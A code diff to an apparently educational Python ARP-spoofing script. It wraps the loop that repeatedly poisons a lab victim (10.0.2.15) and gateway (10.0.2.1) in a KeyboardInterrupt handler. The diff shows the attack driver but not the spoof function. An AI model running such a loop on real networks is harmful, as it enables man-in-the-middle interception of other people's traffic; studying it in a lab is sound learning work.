@@ -31,23 +31,26 @@ def spoof(target_ip, spoof_ip):
 
 if __name__ == "__main__":
     sent_packet_count=0
-    while True:
-        spoof("10.0.2.15", "10.0.2.1")
-        spoof("10.0.2.1", "10.0.2.15")
-        sent_packet_count += 2
-        # The comma at the end tells python to print
-        # everything on one line but only when the
-        # program ends or has been stopped. This is
-        # because python is storing it in a buffer.
-        # This also telling python to print without
-        # the \n character. 2.7 only
-        # print("\rPacket Sent: "+ str(sent_packet_count)),
+    try:
+        while True:
+            spoof("10.0.2.15", "10.0.2.1")
+            spoof("10.0.2.1", "10.0.2.15")
+            sent_packet_count += 2
+            # The comma at the end tells python to print
+            # everything on one line but only when the
+            # program ends or has been stopped. This is
+            # because python is storing it in a buffer.
+            # This also telling python to print without
+            # the \n character. 2.7 only
+            # print("\rPacket Sent: "+ str(sent_packet_count)),
 
-        # Python 3 version of commented statement above and below
-        print("\rPacket Sent: " + str(sent_packet_count),end="")
+            # Python 3 version of commented statement above and below
+            print("\rPacket Sent: " + str(sent_packet_count),end="")
 
-        # This statement tells python to flush the buffer
-        # and only print out the last statement on the
-        # screen or as output for python 2.7
-        # sys.stdout.flush()
-        time.sleep(2)
+            # This statement tells python to flush the buffer
+            # and only print out the last statement on the
+            # screen or as output for python 2.7
+            # sys.stdout.flush()
+            time.sleep(2)
+    except (KeyboardInterrupt):
+        sys.exit("User Manually Stopped Program with CTRL+c")
